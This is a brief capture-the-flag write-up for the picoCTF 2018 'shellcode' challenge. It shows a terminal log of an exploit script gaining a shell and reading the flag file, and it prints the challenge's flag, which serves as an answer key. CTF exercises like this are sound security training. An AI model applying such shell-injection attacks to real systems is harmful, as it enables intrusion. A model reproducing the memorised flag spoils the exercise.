# shellcode - Points: 200 - (Solves: 233)

This [program][1] executes any input you give it.
Can you get a shell?
You can find the program in
/problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd
on the shell server.
[Source][2].

[1]: https://2018shell2.picoctf.com/static/dd374b1b011341e516ddaaca8bcf7323/vuln
[2]: https://2018shell2.picoctf.com/static/dd374b1b011341e516ddaaca8bcf7323/vuln.c

---

Server shell

```sh
% python xpwn.py
[+] Starting local process '/problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd/vuln': pid 4072151
[+] Get the shell
[*] Switching to interactive mode
flag.txt  vuln    vuln.c
$ cat fl*
picoCTF{shellc0de_w00h00_b766002c}$
[*] Stopped process '/problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd/vuln' (pid 4072151)
```

picoCTF{shellc0de_w00h00_b766002c}
